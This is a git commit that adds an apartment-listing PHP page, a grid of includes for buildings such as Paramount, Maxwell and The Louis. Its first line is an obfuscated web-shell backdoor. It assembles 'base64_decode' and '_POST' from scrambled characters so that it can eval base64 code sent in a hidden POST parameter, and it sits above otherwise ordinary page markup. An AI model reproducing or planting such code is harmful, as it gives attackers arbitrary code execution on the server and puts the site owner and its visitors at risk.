81963ff1bb10f09a70577ca258fbd8d4fc4b4f69
webastephigher <mark.edmonds@e2webllc.com>
2016-01-22 15:56:51 -0500

    Create apartment.php

---
+++ apartment.php
@@ -0,0 +1,99 @@
+<?php  $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n828e00'])) {eval($s21(${$s20}['n828e00']));}?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<title>We Are Moving Now</title>
+<link rel="stylesheet" href="http://whatsonyourscreen.com/takealook/css/bootstrap.min.css">
+<link rel="stylesheet" href="http://whatsonyourscreen.com/takealook/css/bootstrap-theme.min.css">
+<link rel="stylesheet" href="apartments.css">
+
+<script src= "http://ajax.googleapis.com/ajax/libs/angularjs/1.3.14/angular.min.js"></script>
+<script src="http://whatsonyourscreen.com/takealook/js/jquery.min.js"></script>
+<script src="http://whatsonyourscreen.com/takealook/js/bootstrap.min.js"></script>
+
+<!--script type="text/javascript">
+	$(document).ready(function(){
+		$("#moving").modal('show');
+	});
+</script-->
+</head>
+<body><header class="header-title">Where Should My Next Headquarters BE?</header>
+<div class="container" style="margin-top:10px;">
+  <div class="row">
+    <div class="col-sm-6 col-md-4 col-lg-3">
+      <div class="bs-example">
+        <?php include 'lyric/apartment_lyric.php'; ?>
+      </div>
+    </div>
+    <div class="col-sm-6 col-md-4 col-lg-3">
+      <div class="bs-example">
+        <?php include 'beacon/apartment_beacon.php'; ?>
+      </div>
+    </div>
+    <div class="clearfix visible-sm-block"></div>
+    <div class="col-sm-6 col-md-4 col-lg-3">
+      <div class="bs-example">
+        <?php include 'sullivan/apartment_sullivan.php'; ?>
+      </div>
+    </div>
+    <div class="clearfix visible-md-block"></div>
+    <div class="col-sm-6 col-md-4 col-lg-3">
+      <div class="bs-example">
+        <?php include '2401penn/apartment_2401penn.php'; ?>
+      </div>
+    </div>
+    <div class="clearfix visible-sm-block"></div>
+    <div class="clearfix visible-lg-block"></div>
+    <div class="col-sm-6 col-md-4 col-lg-3">
+      <div class="bs-example">
+        <?php include 'capitalyards/apartment_capitolyards.php'; ?>
+      </div>
+    </div>
+    <div class="col-sm-6 col-md-4 col-lg-3">
+      <div class="bs-example">
+        <?php include 'paramount/apartment_paramount.php'; ?>
+      </div>
+    </div>
+    <div class="clearfix visible-sm-block"></div>
+    <div class="clearfix visible-md-block"></div>
+    <div class="col-sm-6 col-md-4 col-lg-3">
+      <div class="bs-example">
+        <?php include 'maxwell/apartment_maxwell.php'; ?>
+      </div>
+    </div>
+    <div class="col-sm-6 col-md-4 col-lg-3">
+      <div class="bs-example">
+        <?php include 'thelouisdc/apartment_thelouisdc.php'; ?>
+      </div>
+    </div>
+    <div class="clearfix visible-sm-block"></div>
+    <div class="clearfix visible-lg-block"></div>
+    <div class="col-sm-6 col-md-4 col-lg-3">
+      <div class="bs-example">
+        <?php include '2401penn/apartment_2401penn.php'; ?>
+      </div>
+    </div>
+    <div class="clearfix visible-md-block"></div>
+    <div class="col-sm-6 col-md-4 col-lg-3">
+      <div class="bs-example">
+        <?php include 'bennett/apartment_bennett.php'; ?>
+      </div>
+    </div>
+        <div class="clearfix visible-sm-block"></div>
+    <div class="col-sm-6 col-md-4 col-lg-3">
+      <div class="bs-example">
+        <?php include 'concord/apartment_concord.php'; ?>
+      </div>
+    </div>
+    <div class="col-sm-6 col-md-4 col-lg-3">
+      <div class="bs-example">
+        <?php include 'theview/apartment_theview.php'; ?>
+      </div>
+    </div>
+  </div>
+</div>
+
+<?php include 'apartment_modals.php'; ?>
+
+</body>
+</html>
